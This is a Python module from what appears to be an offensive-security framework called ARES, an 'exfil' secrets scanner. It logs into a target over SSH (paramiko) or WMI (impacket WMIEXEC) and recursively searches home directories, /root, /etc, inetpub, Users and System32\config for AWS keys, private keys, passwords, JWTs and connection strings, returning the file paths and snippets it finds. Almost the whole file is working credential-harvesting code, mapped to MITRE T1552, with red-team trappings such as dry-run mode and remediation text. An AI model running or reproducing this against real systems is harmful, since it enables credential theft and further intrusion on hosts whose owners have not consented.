"""
ARES Exfil Module — Secrets Scanner (T1552 / T1083)

Two live execution paths:
  Linux/SSH  — paramiko connect, run grep -rIl against /home /root /etc /opt /var/www,
               then grep each match for credential regex patterns, parse line hits.
  Windows/WMI — impacket WMIEXEC, run PowerShell Get-ChildItem | Select-String
               against common config paths, parse JSON output.

MITRE ATT&CK:
  T1552   — Unsecured Credentials
  T1552.001 — Credentials In Files
  T1083   — File and Directory Discovery
"""
from __future__ import annotations

import re
import shlex
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.logger import get_logger, audit
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.exfil.secrets_scan")

_SECRET_PATTERNS: dict[str, str] = {
    "aws_access_key":    r"AKIA[0-9A-Z]{16}",
    "generic_api_key":   r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"]?[A-Za-z0-9_\-]{16,}",
    "private_key_pem":   r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
    "password_field":    r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]?.{6,}",
    "connection_string": r"(?i)(server|host)\s*=.{3,};.*(password|pwd)\s*=",
    "jwt_token":         r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
}

_LINUX_SCAN_PATHS = "/home /root /etc /opt /var/www /srv"
_WIN_SCAN_PATHS   = r"C:\inetpub C:\Users C:\ProgramData C:\Windows\System32\config"

# grep pattern that hits any of the regex patterns above
_GREP_PATTERN = "|".join([
    r"AKIA[0-9A-Z]{16}",
    r"(password|passwd|pwd)\s*[=:]",
    r"-----BEGIN.*PRIVATE KEY",
    r"(api_key|apikey)\s*[=:]",
    r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
])


def _classify(line: str) -> str:
    for name, pat in _SECRET_PATTERNS.items():
        if re.search(pat, line, re.IGNORECASE):
            return name
    return "generic_credential"


def _ssh_scan(target: str, username: str, password: str = "",
               key_path: str = "", paths: str = _LINUX_SCAN_PATHS,
               known_hosts_file: str | None = None) -> list[dict]:
    """Run grep scan via paramiko SSH. Returns list of hit dicts.

    Args:
        known_hosts_file: Path to a known_hosts file for strict host-key
            verification. Strongly recommended in production. When omitted,
            AutoAddPolicy is used (MITM risk on untrusted networks).
    """
    import paramiko  # type: ignore[import]
    _log = get_logger("ares.modules.exfil.secrets_scan")
    client = paramiko.SSHClient()
    if known_hosts_file:
        client.set_missing_host_key_policy(paramiko.RejectPolicy())
        client.load_host_keys(known_hosts_file)
        _log.info("ssh_host_key_verification_enabled",
                  target=target, known_hosts=known_hosts_file)
    else:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        _log.warning(
            "ssh_host_key_unverified",
            target=target,
            risk=(
                "Host key not verified — MITM possible on untrusted networks. "
                "Pass known_hosts_file=<path> to enable strict verification."
            ),
        )
    connect_kwargs: dict = {"hostname": target, "username": username, "timeout": 15}
    if key_path:
        connect_kwargs["key_filename"] = key_path
    else:
        connect_kwargs["password"] = password
    client.connect(**connect_kwargs)

    hits: list[dict] = []
    try:
        # Step 1: find files containing credential patterns
        find_cmd = (
            f"grep -rIl "
            f"-E '{_GREP_PATTERN}' "
            f"{paths} 2>/dev/null | head -100"
        )
        _, stdout, _ = client.exec_command(find_cmd)
        matched_files = [l.strip() for l in stdout.read().decode(errors="replace").splitlines() if l.strip()]

        # Step 2: for each matched file, get the matching line + line number
        for fpath in matched_files[:50]:
            grep_cmd = f"grep -nI -E '{_GREP_PATTERN}' {shlex.quote(fpath)} 2>/dev/null | head -5"
            _, fout, _ = client.exec_command(grep_cmd)
            for match_line in fout.read().decode(errors="replace").splitlines():
                parts = match_line.split(":", 2)
                lineno = int(parts[0]) if parts[0].isdigit() else 0
                content = parts[-1][:120] if len(parts) > 1 else match_line[:120]
                hits.append({
                    "file":    fpath,
                    "line":    lineno,
                    "pattern": _classify(content),
                    "snippet": content,
                })
    finally:
        client.close()
    return hits


def _wmi_scan(target: str, username: str, password: str = "",
               domain: str = "", paths: str = _WIN_SCAN_PATHS) -> list[dict]:
    """Run PowerShell credential scan via impacket WMIEXEC."""
    from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import]

    ps_script = (
        r"$paths = @('C:\\inetpub','C:\\Users','C:\\ProgramData'); "
        r"$patterns = @('password\s*=','connectionstring','AKIA[0-9A-Z]{16}','-----BEGIN.*PRIVATE'); "
        r"$hits = @(); "
        r"foreach($p in $paths){"
        r"  Get-ChildItem -Path $p -Recurse -File -ErrorAction SilentlyContinue | "
        r"  Where-Object {$_.Extension -in '.config','.xml','.json','.env','.ini','.txt'} | "
        r"  ForEach-Object { "
        r"    $f=$_.FullName; "
        r"    $patterns | ForEach-Object { "
        r"      $pat=$_; "
        r"      Select-String -Path $f -Pattern $pat -ErrorAction SilentlyContinue | "
        r"      Select-Object -First 3 | ForEach-Object { "
        r"        $hits += [PSCustomObject]@{file=$f;line=$_.LineNumber;snippet=$_.Line.Substring(0,[math]::Min(120,$_.Line.Length))} "
        r"      } "
        r"    } "
        r"  } "
        r"} "
        r"$hits | ConvertTo-Json -Compress"
    )

    cmd = f"powershell.exe -NoProfile -NonInteractive -Command \"{ps_script}\""
    wmi = WMIEXEC(target, username, password, domain, share="ADMIN$", noOutput=False)
    output = wmi.run(cmd)

    import json as _json
    hits: list[dict] = []
    try:
        raw = _json.loads(output.strip()) if output.strip() else []
        if isinstance(raw, dict):
            raw = [raw]
        for item in raw:
            hits.append({
                "file":    item.get("file", ""),
                "line":    item.get("line", 0),
                "pattern": _classify(item.get("snippet", "")),
                "snippet": item.get("snippet", "")[:120],
            })
    except Exception:
        pass
    return hits


class SecretsScan(BaseModule):
    """
    exfil.secrets_scan — Scan filesystem for hardcoded credentials, API keys, private keys, and connection strings

    OPSEC: LOW
    MITRE: "T1552", "T1552.001", "T1083"
    REQUIRES: "target"
    OUTPUTS:  "credential_list", "sensitive_data_found"
    """
    MODULE_ID        = "exfil.secrets_scan"
    MODULE_NAME      = "Secrets Scanner"
    MODULE_CATEGORY  = "exfil"
    MODULE_DESCRIPTION = "Scan filesystem for hardcoded credentials, API keys, private keys, and connection strings"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    REQUIRES         = ["target"]
    OUTPUTS          = ["credential_list", "sensitive_data_found"]
    MITRE_TECHNIQUES = ["T1552", "T1552.001", "T1083"]

    OPSEC_LEVEL      = OpsecLevel.LOW

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "exfil.secrets_scan requires 'target' — IP or hostname.",
                module_id=self.MODULE_ID, field="target",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(**ctx.params)
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("exfil.secrets_scan")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx      = kwargs.get("ctx") or kwargs
        target   = ctx.get("target", "")
        dry_run  = ctx.get("dry_run", True)
        username = ctx.get("username", "")
        password = ctx.get("password", "")
        domain   = ctx.get("domain", "")
        key_path = ctx.get("key_path", "")
        platform = ctx.get("platform", "linux").lower()   # "linux" or "windows"

        if not target:
            return [], {"error": "no_target"}

        logger.info("secrets_scan", target=target, platform=platform, dry_run=dry_run)
        audit("secrets_scan", actor=username or "operator", source="operator",
              target=target, technique="T1552.001")

        if dry_run:
            mock_hits = [
                {"file": r"C:\inetpub\wwwroot\web.config",
                 "pattern": "connection_string", "line": 42,
                 "snippet": "connectionString=\"Server=db01;Password=P@ss1234\""},
                {"file": r"C:\Users\svc_deploy\.aws\credentials",
                 "pattern": "aws_access_key", "line": 3,
                 "snippet": "aws_access_key_id = AKIAIOSFODNN7EXAMPLE"},
            ]
            return [Finding(
                title       = f"Secrets found in filesystem on {target}",
                description = (f"Pattern scan found {len(mock_hits)} potential secret(s): "
                               + ", ".join(h["pattern"] for h in mock_hits)),
                severity=Severity.CRITICAL, confidence=0.80,
                module_id=self.MODULE_ID, host=target,
                mitre_technique="T1552.001", mitre_tactic="Credential Access",
                evidence={"hits": mock_hits},
                remediation="Remove hardcoded credentials. Use vault/secrets manager.",
            )], {"dry_run": True,
                 "credential_list": [h["file"] for h in mock_hits],
                 "sensitive_data_found": True, "hit_count": len(mock_hits)}

        if not username:
            return [], {"error": "no_credential_username"}

        await self.before_request(target, "default")

        try:
            if platform == "windows":
                try:
                    from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import]
                except ImportError:
                    return [], {"error": "impacket_not_installed"}
                hits = _wmi_scan(target, username, password, domain)
            else:
                try:
                    import paramiko  # type: ignore[import]
                except ImportError:
                    return [], {"error": "paramiko_not_installed"}
                hits = _ssh_scan(target, username, password, key_path)

        except Exception as exc:
            raise self._classify_error(exc) from exc

        if hits:
            self.finding(
                title       = f"Secrets found in filesystem on {target}",
                description = (
                    f"Found {len(hits)} potential credential(s) in {len(set(h['file'] for h in hits))} file(s):\n"
                    + "\n".join(f"  [{h['pattern']}] {h['file']}:{h['line']}" for h in hits[:20])
                    + (f"\n...and {len(hits)-20} more" if len(hits) > 20 else "")
                ),
                severity=Severity.CRITICAL, confidence=0.80,
                mitre_technique="T1552.001", mitre_tactic="Credential Access",
                evidence={"hits": hits[:50]},
                remediation=(
                    "Remove hardcoded credentials from all config files. "
                    "Use a secrets manager (Vault, AWS SSM, Azure KV). "
                    "Rotate all exposed credentials immediately."
                ),
                host=target,
            )

        return self._findings[:], {
            "credential_list":     list({h["file"] for h in hits}),
            "sensitive_data_found": bool(hits),
            "hit_count":           len(hits),
        }
